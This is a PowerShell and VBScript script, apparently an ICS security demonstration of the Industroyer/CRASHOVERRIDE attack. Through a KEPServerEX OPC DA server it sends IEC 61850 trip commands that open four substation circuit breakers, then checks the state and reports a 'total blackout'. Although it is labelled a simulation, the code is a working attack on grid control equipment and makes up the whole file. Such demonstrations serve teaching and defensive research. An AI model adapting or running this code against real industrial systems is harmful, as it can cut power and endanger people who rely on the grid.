<# 
  ============================================================
  Industroyer Demo -- OPC DA Breaker Trip Script
  ============================================================
  
  Trips circuit breakers (XCBR1-4) via KEPServerEX OPC DA
  Demonstration payload for Industroyer / CRASHOVERRIDE

  Usage: Double-click run_demo.bat
  !! KEPServerEX must be running before execution !!
#>

# ============================================================
#  Configuration
# ============================================================

$OPC_PROGID = "KEPware.KEPServerEX.V5"
$TAG_PREFIX = "IED1_Ch1.IED.IED1CBIED"
$ATTACK_VALUE = 1
$ATTACK_DELAY = 3

$XCBR_CTRL_TAGS = @(
    "$TAG_PREFIX.XCBR1.CF.Pos.PosCmd",
    "$TAG_PREFIX.XCBR2.CF.Pos.PosCmd",
    "$TAG_PREFIX.XCBR3.CF.Pos.PosCmd",
    "$TAG_PREFIX.XCBR4.CF.Pos.PosCmd"
)

$XCBR_STATUS_TAGS = @(
    "$TAG_PREFIX.XCBR1.ST.Pos.stVal",
    "$TAG_PREFIX.XCBR2.ST.Pos.stVal",
    "$TAG_PREFIX.XCBR3.ST.Pos.stVal",
    "$TAG_PREFIX.XCBR4.ST.Pos.stVal"
)

$FEEDER_NAMES = @(
    "Pivnichna  (North)",
    "Pivdenna   (South)",
    "Skhidna    (East)",
    "Zakhidna   (West)"
)

# ============================================================
#  VBScript Execution Engine (MSScriptControl)
#  Bypasses PowerShell's COM late-binding limitations
# ============================================================

$vbsEngine = New-Object -ComObject "MSScriptControl.ScriptControl"
$vbsEngine.Language = "VBScript"
$vbsEngine.AddCode(@"
Dim opc, grp
Sub ConnectOPC(progId)
    Set opc = CreateObject("OPC.Automation.1")
    opc.Connect progId
    Set grp = opc.OPCGroups.Add("CRASHOVERRIDE")
    grp.IsActive = True
End Sub

Function ReadTag(tagName)
    Dim item, val, qual, ts
    Set item = grp.OPCItems.AddItem(tagName, 1)
    item.Read 1, val, qual, ts
    ReadTag = val
    Call item.Server.OPCItems.Remove(1, Array(0, item.ServerHandle), Array())
End Function

Function WriteTag(tagName, writeVal)
    Dim item, errNum
    Set item = grp.OPCItems.AddItem(tagName, 1)
    On Error Resume Next
    item.Write CInt(writeVal)
    errNum = Err.Number
    On Error GoTo 0
    Call item.Server.OPCItems.Remove(1, Array(0, item.ServerHandle), Array())
    WriteTag = errNum
End Function

Sub DisconnectOPC()
    If Not opc Is Nothing Then
        opc.OPCGroups.RemoveAll
        opc.Disconnect
    End If
End Sub
"@)

# ============================================================
#  Functions
# ============================================================

function Write-Banner {
    $banner = @"

  ================================================================
                   === IEC 61850 Breaker Trip Module  ===
  ================================================================

"@
    Write-Host $banner -ForegroundColor Red
    Write-Host "  [*] Target: Ukrainian Power Grid Substation (Simulation)" -ForegroundColor Yellow
    Write-Host "  [*] Protocol: OPC DA -> IEC 61850 MMS" -ForegroundColor Yellow
    Write-Host "  [*] Objective: Trip all circuit breakers (XCBR1-4)" -ForegroundColor Yellow
    Write-Host ""
}

function Write-Phase($phase, $desc) {
    Write-Host ""
    Write-Host "  ======================================" -ForegroundColor Cyan
    Write-Host "   PHASE $phase : $desc" -ForegroundColor Cyan
    Write-Host "  ======================================" -ForegroundColor Cyan
    Write-Host ""
}

function Write-Status($msg, $color="Gray") {
    $ts = Get-Date -Format "HH:mm:ss.fff"
    Write-Host "  [$ts] $msg" -ForegroundColor $color
}

function Write-Dots($count) {
    for ($i = 0; $i -lt $count; $i++) {
        Start-Sleep -Milliseconds 300
        Write-Host "." -NoNewline -ForegroundColor DarkGray
    }
    Write-Host ""
}

# ============================================================
#  Main
# ============================================================

Clear-Host
Write-Banner

# --- PHASE 1: Reconnaissance ---
Write-Phase "1" "RECONNAISSANCE"
Write-Status "Enumerating local OPC DA servers..." "White"
Write-Dots 3

try {
    $vbsEngine.Run("ConnectOPC", $OPC_PROGID) | Out-Null
    Write-Status "Connected to OPC DA server: $OPC_PROGID" "Green"
} catch {
    Write-Status "FATAL: Could not connect to KEPServerEX!" "Red"
    Write-Status "Error: $($_.Exception.Message)" "Red"
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

Start-Sleep -Seconds 1

# --- PHASE 2: Tag Discovery ---
Write-Phase "2" "TAG DISCOVERY"
Write-Status "Scanning IEC 61850 data model..." "White"
Write-Dots 3

for ($i = 0; $i -lt 4; $i++) {
    Write-Status "  [+] Control: $($XCBR_CTRL_TAGS[$i])" "Yellow"
    Write-Status "  [+] Status:  $($XCBR_STATUS_TAGS[$i])" "DarkYellow"
}
Write-Status "Total targets acquired: 4 breakers" "Green"
Start-Sleep -Seconds 1


# --- PHASE 3: Pre-attack status ---
Write-Phase "3" "PRE-ATTACK STATUS"
Write-Status "Reading current breaker positions..." "White"
Start-Sleep -Milliseconds 500

for ($i = 0; $i -lt 4; $i++) {
    try {
        $val = $vbsEngine.Run("ReadTag", $XCBR_STATUS_TAGS[$i])
        if ($val -eq 2) { Write-Status "  Feeder $($i+1): CLOSED (energized)" "Green" }
        elseif ($val -eq 1) { Write-Status "  Feeder $($i+1): OPEN (de-energized)" "Red" }
        else { Write-Status "  Feeder $($i+1): UNKNOWN ($val)" "DarkGray" }
    } catch {
        Write-Status "  Feeder $($i+1): READ ERROR" "Red"
    }
}

Start-Sleep -Seconds 2

# --- PHASE 4: Attack execution ---
Write-Phase "4" "ATTACK EXECUTION"
Write-Host "  !! INITIATING BREAKER TRIP SEQUENCE !!" -ForegroundColor Red
Write-Host ""
Start-Sleep -Seconds 1

for ($i = 0; $i -lt 4; $i++) {
    $feeder = $FEEDER_NAMES[$i]
    Write-Status "Targeting Feeder $($i+1) [$feeder]..." "Yellow"
    Start-Sleep -Milliseconds 500
    
    Write-Status "  Sending OPC Write: PosCmd = $ATTACK_VALUE (OPEN/TRIP)" "Red"
    
    try {
        $errNum = $vbsEngine.Run("WriteTag", $XCBR_CTRL_TAGS[$i], $ATTACK_VALUE)
        if ($errNum -eq 0) {
            Write-Status "  >> BREAKER XCBR$($i+1) TRIPPED SUCCESSFULLY <<" "Red"
        } else {
            Write-Status "  WRITE FAILED (VBS Error $errNum)" "Magenta"
        }
    } catch {
        Write-Status "  WRITE FAILED: $($_.Exception.Message)" "Magenta"
    }
    
    if ($i -lt 3) {
        Write-Status "  Waiting ${ATTACK_DELAY}s before next target..." "DarkGray"
        Start-Sleep -Seconds $ATTACK_DELAY
    }
    Write-Host ""
}

Start-Sleep -Seconds 1

# --- PHASE 5: Post-attack verification ---
Write-Phase "5" "POST-ATTACK VERIFICATION"
Write-Status "Verifying breaker states..." "White"
Start-Sleep -Seconds 1

$allTripped = $true
for ($i = 0; $i -lt 4; $i++) {
    try {
        $val = $vbsEngine.Run("ReadTag", $XCBR_STATUS_TAGS[$i])
        if ($val -eq 1) { 
            Write-Status "  XCBR$($i+1): OPEN  -- TRIPPED" "Red" 
        } elseif ($val -eq 2) { 
            Write-Status "  XCBR$($i+1): CLOSED (still energized!)" "Yellow"
            $allTripped = $false 
        } else {
            Write-Status "  XCBR$($i+1): UNKNOWN ($val)" "DarkGray"
            $allTripped = $false 
        }
    } catch {
        Write-Status "  XCBR$($i+1): VERIFICATION ERROR" "DarkGray"
        $allTripped = $false 
    }
}

Write-Host ""
if ($allTripped) {
    Write-Host "  ========================================" -ForegroundColor Red
    Write-Host "   ATTACK COMPLETE: ALL BREAKERS TRIPPED" -ForegroundColor Red
    Write-Host "   TOTAL BLACKOUT ACHIEVED" -ForegroundColor Red
    Write-Host "  ========================================" -ForegroundColor Red
} else {
    Write-Host "  ========================================" -ForegroundColor Yellow
    Write-Host "   ATTACK PARTIALLY COMPLETE" -ForegroundColor Yellow
    Write-Host "  ========================================" -ForegroundColor Yellow
}

# --- Cleanup ---
Write-Host ""
Write-Status "Cleaning up OPC connection..." "DarkGray"
try {
    $vbsEngine.Run("DisconnectOPC") | Out-Null
    Write-Status "Disconnected from OPC server" "DarkGray"
} catch {}

Write-Host ""
Write-Host "  ================================================================" -ForegroundColor DarkCyan
Write-Host "   CRASHOVERRIDE payload execution finished." -ForegroundColor DarkCyan
Write-Host "   Check SCADA HMI for visual confirmation." -ForegroundColor DarkCyan
Write-Host "  ================================================================" -ForegroundColor DarkCyan
Write-Host ""
Write-Host "  Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
